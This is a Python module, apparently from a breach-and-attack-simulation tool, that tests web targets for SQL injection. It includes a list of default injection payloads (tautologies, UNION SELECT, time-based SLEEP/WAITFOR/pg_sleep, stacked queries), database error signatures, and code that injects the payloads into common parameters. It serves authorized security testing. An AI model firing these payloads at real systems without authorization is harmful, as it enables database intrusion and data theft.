"""
SQL Injection testing module.

Tests for SQL injection vulnerabilities using error-based, union-based,
blind (boolean and time-based), and out-of-band techniques.

MITRE ATT&CK: T1190 - Exploit Public-Facing Application
"""

from __future__ import annotations

import re
import uuid
from typing import Any
from urllib.parse import urlencode

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Error signatures indicating SQL injection
SQL_ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning:.*mysql",
    r"unclosed quotation mark",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"supplied argument is not a valid mysql",
    # PostgreSQL
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"unterminated quoted string",
    r"invalid input syntax for",
    r"ERROR:\s+syntax error at or near",
    # MSSQL
    r"microsoft ole db provider for sql server",
    r"microsoft ole db provider for odbc drivers",
    r"microsoft sql native client",
    r"unclosed quotation mark after the character string",
    r"\[sql server\]",
    # Oracle
    r"ora-\d{5}",
    r"oracle error",
    r"oracle.*driver",
    r"quoted string not properly terminated",
    # SQLite
    r"sqlite3\.operationalerror",
    r"sqlite\.error",
    r"unrecognized token",
    r"near \".*\": syntax error",
    # Generic
    r"sql syntax.*error",
    r"syntax error.*sql",
    r"invalid query",
    r"sql command not properly ended",
]

COMPILED_SIGNATURES = [re.compile(sig, re.IGNORECASE) for sig in SQL_ERROR_SIGNATURES]

# Default payloads for quick testing
DEFAULT_SQLI_PAYLOADS = [
    # Error-based detection
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' UNION SELECT 1,2,3--",
    # Time-based blind
    "1' AND SLEEP(5)--",
    "1' AND (SELECT SLEEP(5))--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND pg_sleep(5)--",
    # Boolean-based blind
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",
    # Stacked queries
    "1; SELECT 1--",
    "1'; SELECT pg_sleep(5)--",
]


class SQLInjectionModule(BaseAttackModule):
    """SQL Injection testing module with error, union, blind, and time-based detection."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="sqli",
            description="SQL Injection testing - error-based, union, blind, time-based",
            category="sqli",
            mitre_technique_ids=["T1190"],
            mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT,
            owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-89"],
            tags=["injection", "database", "sqli"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """Get SQL injection payloads from database or defaults."""
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("sqli", limit=200)
            if db_payloads:
                return db_payloads
        return DEFAULT_SQLI_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        """Build SQLi test requests."""
        requests = []
        inject_params = options.get("params", ["id", "q", "search", "page", "user", "name"])
        method = options.get("method", "GET")
        path = options.get("path", "/")

        for payload in payloads:
            for param in inject_params:
                req_id = str(uuid.uuid4())[:8]
                if method.upper() == "GET":
                    requests.append(AttackRequest(
                        request_id=f"sqli-{req_id}",
                        target=target,
                        method="GET",
                        path=path,
                        params={param: payload},
                        timeout=options.get("timeout", 30.0),
                    ))
                else:
                    requests.append(AttackRequest(
                        request_id=f"sqli-{req_id}",
                        target=target,
                        method="POST",
                        path=path,
                        body=urlencode({param: payload}),
                        content_type="application/x-www-form-urlencoded",
                        timeout=options.get("timeout", 30.0),
                    ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        """Analyze response for SQL injection indicators."""
        body = response.body_text.lower()

        # Check for SQL error signatures
        for pattern in COMPILED_SIGNATURES:
            match = pattern.search(body)
            if match:
                return ModuleResult(
                    module_name="sqli",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"SQL error signature detected: {match.group(0)}",
                    severity="high",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "error_based", "matched_pattern": match.group(0)},
                )

        # Time-based blind detection
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "pg_sleep" in payload:
            if response.elapsed_ms > 4500:  # Expected 5s sleep
                return ModuleResult(
                    module_name="sqli",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Time-based blind SQLi: response took {response.elapsed_ms:.0f}ms (expected delay from SLEEP)",
                    severity="high",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "time_based_blind"},
                )

        # Boolean-based blind detection (compare true/false responses)
        # This is tracked across requests and analyzed in the execute() method

        return ModuleResult(
            module_name="sqli",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )
